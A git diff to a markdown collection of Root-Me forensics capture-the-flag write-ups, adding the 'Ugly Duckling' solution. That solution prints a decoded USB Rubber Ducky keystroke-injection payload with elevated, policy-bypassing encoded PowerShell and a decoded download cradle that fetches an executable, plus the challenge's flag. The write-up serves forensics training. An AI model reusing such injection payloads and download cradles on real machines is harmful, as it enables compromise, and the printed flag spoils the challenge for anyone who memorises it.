@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Forensics [6/28]
+# [Root-Me](./rootme.md) Root-Me Forensics [8/28]
 
 Train digital investigation skills by analyzing memory dumps, log files, network captures...
 
@@ -8,7 +8,7 @@ Train digital investigation skills by analyzing memory dumps, log files, network
 2. [Logs analysis - web attack](#logs-analysis-web-attack) 🗸
 3. [Command & Control - level 5](#command-and-control-level-5) 🗸
 4. [Find the cat](#find-the-cat) 🗸
-5. [Ugly Duckling](#ugly-duckling)
+5. [Ugly Duckling](#ugly-duckling) 🗸
 6. [Active Directory - GPO](#active-directory-gpo)
 7. [Command & Control - level 3](#command-and-control-level-3) 🗸
 8. [DNS exfiltration](#dns-exfiltration)
@@ -289,7 +289,6 @@ g9UWD8EZgBhBpc4nTSAS
 
 ---
 
-
 ## Command and Control level 5
 
 - Author: Thanat0s
@@ -421,7 +420,6 @@ passw0rd
 ### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
-
 
 ## Find the cat
 
@@ -586,6 +584,127 @@ This can be entered into google maps to find the city.
 
 ~~~
 helfrantzkirch
+~~~
+
+</details>
+
+---
+
+### [Forensics](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## Ugly Duckling
+
+- Author: eilco
+- Date: 24 April 2017
+- Points: 25
+- Level: 3
+
+### Statement
+
+The CEO’s computer seems to have been compromised internally. A young trainee dissatisfied with not having been paid during his internship arouse our supsicion. A strange USB stick containing a binary file was found on the trainee’s desk. The CEO relies on you to analyze this file.
+
+### Link
+
+1. [ch14.zip](http://challenge01.root-me.org/forensic/ch14/ch14.zip)
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+The challenge archive can be downloaded, inflated and reviewed:
+
+~~~shell
+$ wget http://challenge01.root-me.org/forensic/ch14/ch14.zip
+--2022-01-29 18:29:16--  http://challenge01.root-me.org/forensic/ch14/ch14.zip
+Resolving challenge01.root-me.org (challenge01.root-me.org)... 212.129.38.224, 2001:bc8:35b0:c166::151
+Connecting to challenge01.root-me.org (challenge01.root-me.org)|212.129.38.224|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 771 [application/zip]
+Saving to: ‘ch14.zip’
+
+ch14.zip                                                    100%[=========================================================================================================================================>]     771  --.-KB/s    in 0s      
+
+2022-01-29 18:29:16 (282 MB/s) - ‘ch14.zip’ saved [771/771]
+$ unzip ch14.zip 
+Archive:  ch14.zip
+  inflating: file.bin                
+$ ls
+ch14.zip  file.bin
+$ file file.bin 
+file.bin: data
+~~~
+
+The challenge suggests this is a ducky encoded injection file.  It can be decoded using an [online tool](https://ducktoolkit.com/decode#):
+
+~~~
+DELAY
+iexplore http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpgENTER
+DELAY
+DELAY
+ENTER
+DELAY
+DELAY
+%USERPROFILE%\Documents\796f75277665206265656e2054524f4c4c4544.jpgDELAY
+ENTER
+DELAY
+TAB
+DELAY
+TAB
+DELAY
+TAB
+DELAY
+TAB
+DELAY
+TAB
+DELAY
+TAB
+DELAY
+TAB
+DELAY
+ENTER
+DELAY
+DOWNARROW
+DELAY
+DOWNARROW
+DELAY
+DOWNARROW
+DELAY
+DOWNARROW
+DELAY
+ENTER
+DELAY
+DOWNARROW
+DELAY
+DOWNARROW
+DELAY
+ENTER
+DELAY
+powershell Start-Process powershell -Verb runAsDELAY
+PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
+~~~
+
+Decoding the bas64 string, a downloadable executable can be found. 
+
+~~~
+iex (New-Object System.Net.WebClient).DownloadFile('http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe','666c61676765643f.exe');
+~~~
+
+This executable can be decompiled in Ghidra and the flag can be found as a string in the executable memory.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+RubberDuckyFail3D
 ~~~
 
 </details>
